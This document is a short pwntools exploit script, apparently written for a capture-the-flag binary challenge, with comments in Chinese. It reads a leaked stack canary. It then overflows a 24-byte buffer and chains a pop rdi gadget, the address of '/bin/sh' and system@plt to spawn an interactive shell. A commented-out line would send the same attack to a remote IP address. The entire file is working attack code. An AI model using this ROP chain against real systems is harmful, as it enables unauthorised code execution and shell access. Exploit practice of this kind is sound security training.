from kk import *
#r = remote('39.107.114.99', 32803)
r = process('./c')

r.recvuntil(b'canary = 0x')
canary = int(r.recvline().strip(), 16)
print(f"canary = {hex(canary)}")

GDB(r)
pop_rdi = 0x4011ca
system_plt = 0x401060
system = 0x401197
bin_sh = 0x40200a
ret = 0x40101a

# 构造 payload
payload = b'A' * 24              # 填满 buf[24]
payload += p64(canary)           # canary
payload += b'B' * 8              # 覆盖 rbp
payload += p64(pop_rdi)          # pop rdi; ret
payload += p64(bin_sh)           # "/bin/sh" 地址
payload += p64(system_plt)       # system("/bin/sh")

r.send(payload)
r.interactive()